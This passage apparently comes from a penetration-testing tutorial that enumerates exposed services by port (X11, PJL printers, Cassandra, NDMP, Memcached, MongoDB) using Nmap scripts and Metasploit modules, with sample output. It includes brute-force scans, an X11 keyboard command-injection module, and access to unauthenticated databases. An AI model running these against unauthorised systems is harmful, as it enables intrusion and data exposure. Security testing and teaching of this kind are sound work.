</span><span class='line'>  Relative upper-left Y:  0
</span><span class='line'>  Width: 1024
</span><span class='line'>  Height: 768
</span><span class='line'>  Depth: 16
</span><span class='line'>  Visual: 0x21
</span><span class='line'>  Visual Class: TrueColor
</span><span class='line'>  Border width: 0
</span><span class='line'>  Class: InputOutput
</span><span class='line'>  Colormap: 0x20 (installed)
</span><span class='line'>  Bit Gravity State: ForgetGravity
</span><span class='line'>  Window Gravity State: NorthWestGravity
</span><span class='line'>  Backing Store State: NotUseful
</span><span class='line'>  Save Under State: no
</span><span class='line'>  Map State: IsViewable
</span><span class='line'>  Override Redirect State: no
</span><span class='line'>  Corners:  +0+0  -0+0  -0-0  +0-0
</span><span class='line'>  -geometry 1024x768+0+0</span></code></pre></td></tr></table></div></figure></p>

<p>For <strong>live viewing</strong> we need to use
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
</span><span class='line'>./xwatchwin 10.9.xx.xx:0 -w 0x45</span></code></pre></td></tr></table></div></figure>
</li>
<li> We can also do <strong>X11 Keyboard Command Injection</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/unix/x11/x11_keyboard_exec</span></code></pre></td></tr></table></div></figure></p>

<p>For more information: Refer: <a href="http://rageweb.info/2014/05/04/open-x11-server/">Open-x11-server</a>
</li>
</ol></p>

<h3>PJL | Port 9100</h3>

<p>There are multiple modules in the metasploit for PJL.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   Name                                             Disclosure Date  Rank    Description
</span><span class='line'>   &mdash;-                                             &mdash;&mdash;&mdash;&mdash;&mdash;  &mdash;-    &mdash;&mdash;&mdash;&ndash;
</span><span class='line'>   auxiliary/scanner/printer/printer_delete_file                     normal  Printer File Deletion Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_download_file                   normal  Printer File Download Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_env_vars                        normal  Printer Environment Variables Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_list_dir                        normal  Printer Directory Listing Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_list_volumes                    normal  Printer Volume Listing Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_ready_message                   normal  Printer Ready Message Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_upload_file                     normal  Printer File Upload Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_version_info                    normal  Printer Version Information Scanner
</span><span class='line'>   auxiliary/server/capture/printjob_capture                         normal  Printjob Capture Service</span></code></pre></td></tr></table></div></figure>
As of now, We only got a chance to use
<ol>
<li><strong>Printer Version Information Scanner</strong> which scans for printer version information using the Printer Job Language (PJL) protocol.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/printer/printer_version_info</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:9100 - HP LaserJet M1522nf MFP
</span><span class='line'>[<em>] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[</em>] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p><strong>Nmap</strong> also one NSE which is
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/pjl-ready-message.html">PJL-ready-message</a> It retrieves or sets the ready message on printers that support the Printer Job Language. This includes most PostScript printers that listen on port 9100. Without an argument, displays the current ready message. With the pjl_ready_message script argument, displays the old ready message and changes it to the message given.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap &ndash;script=pjl-ready-message.nse -n -p 9100 10.10.xx.xx
</span><span class='line'>
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.14s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>9100/tcp open  jetdirect
</span><span class='line'>|_pjl-ready-message: &ldquo;Processing&hellip;&rdquo;</span></code></pre></td></tr></table></div></figure>
</li></p>

<p></ol></p>

<h3>Apache Cassandra | Port 9160</h3>

<p>For Apache Cassandra, NMap has two nse script</p>

<p><ol>
<li>
<a href="https://nmap.org/nsedoc/scripts/cassandra-info.html">cassandra-info</a> which attempts to get basic info and server status from a Cassandra database.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 9160 10.10.xx.xx -n &ndash;script=cassandra-info
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-27 21:14 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.16s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>9160/tcp open  cassandra
</span><span class='line'>| cassandra-info:
</span><span class='line'>|   Cluster name: Convoy
</span><span class='line'>|_  Version: 19.20.0</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><a href="https://nmap.org/nsedoc/scripts/cassandra-brute.html">cassandra-brute</a> which performs brute force password auditing against the Cassandra database.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 9160 122.166.xx.xx -n &ndash;script=cassandra-brute
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-27 21:19 IST
</span><span class='line'>Nmap scan report for 122.166.xx.xx
</span><span class='line'>Host is up (0.083s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>9160/tcp open  apani1
</span><span class='line'>|_cassandra-brute: Any username and password would do, &lsquo;default&rsquo; was used to test</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<h3>Network Data Management Protocol (ndmp) | Port 10000</h3>

<p><strong>Nmap NSE</strong> has
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ndmp-fs-info.html">ndmp-fs-info</a> can be used to list remote file systems
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -s ndmp -p 10000
</span><span class='line'>services -p 10000 -s ndmp -o /tmp/ndmp.ports
</span><span class='line'>cat /tmp/ndmp.ports | cut -d , -f1 | tr -d \&ldquo; | grep -v host &gt; /tmp/ndmp.ports.2</span></code></pre></td></tr></table></div></figure>
Pass this to nmap
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 10000 &ndash;script ndmp-fs-info -n -iL /tmp/ndmp.ports.2</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>| ndmp-fs-info:
</span><span class='line'>| FS       Logical device             Physical device
</span><span class='line'>| NTFS     C:                         Device0000
</span><span class='line'>| NTFS     D:                         Device0000
</span><span class='line'>| NTFS     E:                         Device0000
</span><span class='line'>| RMAN     Oracle-Win::\TRDPLM\WIND  Device0000
</span><span class='line'>| UNKNOWN  Shadow Copy Components     Device0000
</span><span class='line'>|_UNKNOWN  System State               Device0000
</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/ndmp-version.html">ndmp-version</a> : Retrieves version information from the remote Network Data Management Protocol (ndmp) service. NDMP is a protocol intended to transport data between a NAS device and the backup device, removing the need for the data to pass through the backup server. This nse although is not outputing the version correctly, however if we switch to &ndash;script-trace we do find the versions
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00               <br/>
</span><span class='line'>00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
</span><span class='line'>00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.   <br/>
</span><span class='line'>00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
</span><span class='line'>00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3   <br/>
</span><span class='line'>00000060: 00 00 00 be 00 00 00 05 00 00 00 04                       <br/>
</span><span class='line'>
</span><span class='line'>NSOCK INFO [5.0650s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 1122 [10.10.xx.xx:10000] (108 bytes)
</span><span class='line'>NSE: TCP 10.10.xx.xx:40435 &lt; 10.10.9.12:10000 | 00000000: 80 00 00 68 00 00 00 03 56 f1 64 e7 00 00 00 01    h    V d   <br/>
</span><span class='line'>00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00               <br/>
</span><span class='line'>00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
</span><span class='line'>00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.   <br/>
</span><span class='line'>00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
</span><span class='line'>00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3  </span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<h3>Memcache | Port 11211</h3>

<p>Memcached is a free &amp; open source, high-performance, distributed memory object caching system.</p>

<p>There&rsquo;s a nmap script
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/memcached-info.html">memcached-info</a> : Retrieves information (including system architecture, process ID, and server time) from distributed memory object caching system memcached.
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 11211 &ndash;script memcached-info 10.10.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-27 02:48 IST
</span><span class='line'>Nmap scan report for email.xxxxxx.com (10.10.xx.xx)
</span><span class='line'>Host is up (0.082s latency).
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>11211/tcp open  unknown
</span><span class='line'>| memcached-info:
</span><span class='line'>|   Process ID           4252
</span><span class='line'>|   Uptime               1582276 seconds
</span><span class='line'>|   Server time          2016-03-26T21:18:15
</span><span class='line'>|   Architecture         64 bit
</span><span class='line'>|   Used CPU (user)      25.881617
</span><span class='line'>|   Used CPU (system)    17.413088
</span><span class='line'>|   Current connections  14
</span><span class='line'>|   Total connections    41
</span><span class='line'>|   Maximum connections  1024
</span><span class='line'>|   TCP Port             11211
</span><span class='line'>|   UDP Port             11211
</span><span class='line'>|_  Authentication       no
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<p>We can also telnet to this port: Stats is one of the commands
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>telnet 10.10.xx.xx 11211
</span><span class='line'>stats
</span><span class='line'>STAT pid 4252
</span><span class='line'>STAT uptime 1582386
</span><span class='line'>STAT time 1459027205
</span><span class='line'>STAT version 1.4.10
</span><span class='line'>STAT libevent 2.0.16-stable
</span><span class='line'>STAT pointer_size 64
</span><span class='line'>STAT rusage_user 25.889618
</span><span class='line'>STAT rusage_system 17.417088
</span><span class='line'>STAT curr_connections 14
</span><span class='line'>STAT total_connections 42
</span><span class='line'>STAT connection_structures 15
</span><span class='line'>STAT reserved_fds 20
</span><span class='line'>STAT cmd_get 3
</span><span class='line'>STAT cmd_set 3
</span><span class='line'>STAT cmd_flush 0
</span><span class='line'>STAT cmd_touch 0
</span><span class='line'>STAT get_hits 2
</span><span class='line'>STAT get_misses 1
</span><span class='line'>STAT delete_misses 0
</span><span class='line'>STAT delete_hits 0
</span><span class='line'>STAT incr_misses 0
</span><span class='line'>STAT incr_hits 0
</span><span class='line'>STAT decr_misses 0
</span><span class='line'>STAT decr_hits 0
</span><span class='line'>STAT cas_misses 0
</span><span class='line'>STAT cas_hits 0
</span><span class='line'>STAT cas_badval 0
</span><span class='line'>STAT touch_hits 0
</span><span class='line'>STAT touch_misses 0
</span><span class='line'>STAT auth_cmds 0
</span><span class='line'>STAT auth_errors 0
</span><span class='line'>STAT bytes_read 775
</span><span class='line'>STAT bytes_written 26158
</span><span class='line'>STAT limit_maxbytes 67108864
</span><span class='line'>STAT accepting_conns 1
</span><span class='line'>STAT listen_disabled_num 0
</span><span class='line'>STAT threads 4
</span><span class='line'>STAT conn_yields 0
</span><span class='line'>STAT hash_power_level 16
</span><span class='line'>STAT hash_bytes 524288
</span><span class='line'>STAT hash_is_expanding 0
</span><span class='line'>STAT expired_unfetched 0
</span><span class='line'>STAT evicted_unfetched 0
</span><span class='line'>STAT bytes 87
</span><span class='line'>STAT curr_items 1
</span><span class='line'>STAT total_items 1
</span><span class='line'>STAT evictions 0
</span><span class='line'>STAT reclaimed 0
</span><span class='line'>END</span></code></pre></td></tr></table></div></figure></p>

<p>Sensepost has written a tool <a href="https://github.com/sensepost/go-derper">go-derper</a> and a article here <a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">blackhat-write-up-go-derper-and-mining-memcaches</a>  Blackhat slides here <a href="https://media.blackhat.com/bh-ad-10/Sensepost/BlackHat-AD-2010-Slaviero-Lifting-the-Fog-slides.pdf">BlackHat-AD-2010-Slaviero-Lifting-the-Fog-Slides</a></p>

<h3>MongoDB | Port 27017 and Port 27018</h3>

<p><a href="https://github.com/all3g/exploit-exercises/tree/master/mongodb">mongodb</a> provides a good walkthru how to check for vulns in mongodb;</p>

<p><strong>Metasploit</strong> has</p>

<p><ol>
<li><strong>MongoDB Login Utility</strong>:   This module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication. This can be used to check if there is no-authentication on the MongoDB by setting blank_passwords to true. This can also be checked using the Nmap nse mongodb-brute
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mongodb/mongodb_login</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Scanning IP: 10.169.xx.xx
</span><span class='line'>[+] Mongo server 10.169.xx.xx dosn&rsquo;t use authentication</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p><strong>Nmap</strong> has three NSEs for mongo db databases
<ol>
<li>Mongodb-info:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap 10.169.xx.xx -p 27017 -sV &ndash;script mongodb-info
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-26 02:23 IST
</span><span class='line'>Nmap scan report for mongod.example.com (10.169.xx.xx)
</span><span class='line'>Host is up (0.088s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>27017/tcp open  mongodb MongoDB 2.6.9 2.6.9
</span><span class='line'>| mongodb-info:
</span><span class='line'>|   MongoDB Build info
</span><span class='line'>|     OpenSSLVersion =
</span><span class='line'>|     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-function -Wno-deprecated-declarations -fno-builtin-memcmp
</span><span class='line'>|     loaderFlags = -fPIC -pthread -Wl,-z,now -rdynamic
</span><span class='line'>|     version = 2.6.9
</span><span class='line'>|     ok = 1
</span><span class='line'>|     maxBsonObjectSize = 16777216
</span><span class='line'>|     debug = false
</span><span class='line'>|     bits = 64
</span><span class='line'>|     javascriptEngine = V8
</span><span class='line'>|     sysInfo = Linux build20.mongod.example.com 2.6.32-431.3.1.el6.x86_64 #1 SMP Fri Jan 3 21:39:27 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
</span><span class='line'>|     versionArray
</span><span class='line'>|       1 = 6
</span><span class='line'>|       2 = 9
</span><span class='line'>|       3 = 0
</span><span class='line'>|       0 = 2
</span><span class='line'>|     allocator = tcmalloc
</span><span class='line'>|     gitVersion = df313bc75aa94d192330cb92756fc486ea604e64
</span><span class='line'>|   Server status
</span><span class='line'>|     opcounters
</span><span class='line'>|       query = 19752
</span><span class='line'>|       update = 1374
</span><span class='line'>|       insert = 71735056
</span><span class='line'>|       command = 78465013
</span><span class='line'>|       delete = 121
</span><span class='line'>|       getmore = 4156
</span><span class='line'>|     connections
</span><span class='line'>|       available = 795
</span><span class='line'>|       totalCreated = 4487
</span><span class='line'>|       current = 24
</span><span class='line'>|     uptimeMillis = 3487298933
</span><span class='line'>|     localTime = 1458938079849
</span><span class='line'>|     metrics
</span><span class='line'>|       getLastError
</span><span class='line'>|         wtime
</span><span class='line'>|           num = 0
</span><span class='line'>|           totalMillis = 0
</span><span class='line'>|     uptimeEstimate = 3455635
</span><span class='line'>|     version = 2.6.9
</span><span class='line'>|     uptime = 3487299
</span><span class='line'>|     network
</span><span class='line'>|       bytesOut = 17159001651
</span><span class='line'>|       numRequests = 78517212
</span><span class='line'>|       bytesIn = 73790966211
</span><span class='line'>|     host = nvt-prod-05
</span><span class='line'>|     mem
</span><span class='line'>|       supported = true
</span><span class='line'>|       virtual = 344
</span><span class='line'>|       resident = 31
</span><span class='line'>|       bits = 64
</span><span class='line'>|     pid = 25964
</span><span class='line'>|     extra_info
</span><span class='line'>|       heap_usage_bytes = 2798848
</span><span class='line'>|       page_faults = 16064
</span><span class='line'>|       note = fields vary by platform
</span><span class='line'>|     asserts
</span><span class='line'>|       warning = 1
</span><span class='line'>|       regular = 1
</span><span class='line'>|       rollovers = 0
</span><span class='line'>|       user = 11344
</span><span class='line'>|       msg = 0
</span><span class='line'>|     process = mongos
</span><span class='line'>|_    ok = 1
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>Mongodb-database to find the databases in the mongodb.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap 122.169.xx.xx -p 27017 -sV &ndash;script mongodb-databases.nse
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-26 02:23 IST
</span><span class='line'>Nmap scan report for mongod.example.com (10.169.xx.xx)
</span><span class='line'>Host is up (0.090s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>27017/tcp open  mongodb MongoDB 2.6.9
</span><span class='line'>| mongodb-databases:
</span><span class='line'>|   ok = 1
</span><span class='line'>|   databases
</span><span class='line'>|     1
</span><span class='line'>|       shards
</span><span class='line'>|         rs0 = 1
</span><span class='line'>|       sizeOnDisk = 1
</span><span class='line'>|       empty = true
</span><span class='line'>|       name = test
</span><span class='line'>|     0
</span><span class='line'>|       shards
</span><span class='line'>|         rs0 = 21415067648
</span><span class='line'>|         rs1 = 17122197504
</span><span class='line'>|       sizeOnDisk = 38537265152
</span><span class='line'>|       empty = false
</span><span class='line'>|       name = genprod
</span><span class='line'>|     3
</span><span class='line'>|       sizeOnDisk = 16777216
</span><span class='line'>|       empty = false
</span><span class='line'>|       name = admin
</span><span class='line'>|     2
</span><span class='line'>|       sizeOnDisk = 50331648
</span><span class='line'>|       empty = false
</span><span class='line'>|       name = config
</span><span class='line'>|   totalSize = 38537265153
</span><span class='line'>|_  totalSizeMb = 36752</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>Mongodb-BruteForce
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap 10.169.xx.xx -p 27017 -sV &ndash;script mongodb-brute -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-26 02:28 IST
</span><span class='line'>Nmap scan report for 122.169.xx.xx
</span><span class='line'>Host is up (0.086s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>27017/tcp open  mongodb MongoDB 2.6.9
</span><span class='line'>|_mongodb-brute: No authentication needed</span></code></pre></td></tr></table></div></figure></p>

<p>This database can be connected using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongo 10.169.xx.xx
</span><span class='line'>MongoDB shell version: 2.4.10
</span><span class='line'>connecting to: 122.169.xx.xx/test</span></code></pre></td></tr></table></div></figure>
Show DBS can be used to see the current databases;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongos&gt; show dbs
</span><span class='line'>admin 0.015625GB
</span><span class='line'>config    0.046875GB
</span><span class='line'>genprod   35.890625GB
</span><span class='line'>test  (empty)</span></code></pre></td></tr></table></div></figure>
Use command can be used select the database
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongos&gt; use admin
</span><span class='line'>switched to db admin</span></code></pre></td></tr></table></div></figure>
Show collections can be used to see the tables;
